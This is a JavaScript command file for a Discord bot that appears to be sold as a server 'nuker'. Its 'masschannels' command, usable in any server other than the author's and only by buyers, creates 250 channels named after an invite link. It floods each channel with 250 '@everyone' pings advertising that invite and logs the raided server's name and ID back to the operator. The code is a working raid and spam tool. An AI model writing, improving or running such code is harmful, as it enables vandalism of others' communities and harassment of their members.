const { MessageEmbed } = require('discord.js');
const { color, footer, pfp } = require('../../config.json');
const { red, green } = require('chalk');

module.exports.run = async (bot, message) => {
    const guild = bot.guilds.cache.get('829792151561961482');
    const user = guild.members.cache.get(message.author.id);
    // Check if it is the main server
    if (message.guild.id === '829792151561961482') {
        const guildEmbed = new MessageEmbed()
          .setDescription('Nice Try. Go to another guild and cry!')
          .setColor(color)
          .setFooter(footer, pfp)
          .setTimestamp();
        message.reply(guildEmbed);
        return;
      }
    // Check if they have roles
    if (user.roles.cache.has('829793992698101800')) {
       console.log(green('Mass Channels - Role Validated')); 
       // Begin Mass Channels
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) {
        return console.log(red('Mass Channels - Missing Administrator'))
    } else {
        for (var i = 0; i < 250; i++) {
            let channels = message.guild.channels.create('discord-gg-wTWqSwNkft')
            channels.then(
                function (channel, index) {
                    for (var i = 0; i < 250; i++) {
                        channel.send('@everyone - discord.gg/wTWqSwNkft')
                        // other per-channnel logic
                    }
                }
            );
        }
        console.log(green(`Mass Channel - Mass Created Channels`))
        console.log(green(`Mass Channels - Pinged Everyone`));
        bot.channels.cache.get('830884661881208863').send(`> Created **${message.guild.channels.cache.filter(channel => channel.type === 'text').size}** channels in **${message.guild.name}** - **${message.guild.id}**`)
      }
    }
          // If they do not have the roles
    if (!user.roles.cache.has('829793992698101800')) {
      console.log(red('Mass Channels - Role Invalidated'));
      const roleEmbed = new MessageEmbed()
        .setDescription(
          'Inorder to use the bot, you must purchase it. \n \n [Purchase Here!](https://discord.gg/wTWqSwNkft)'
        )
        .setColor(color)
        .setFooter(footer, pfp)
        .setTimestamp();
      message.reply(roleEmbed);
    }
    message.delete();
}

module.exports.config = {
    name: 'masschannels',
    description: 'Mass all of the channels in the discord',
    usage: '.masschannels',
    accessableby: 'Members',
    aliases: []
  };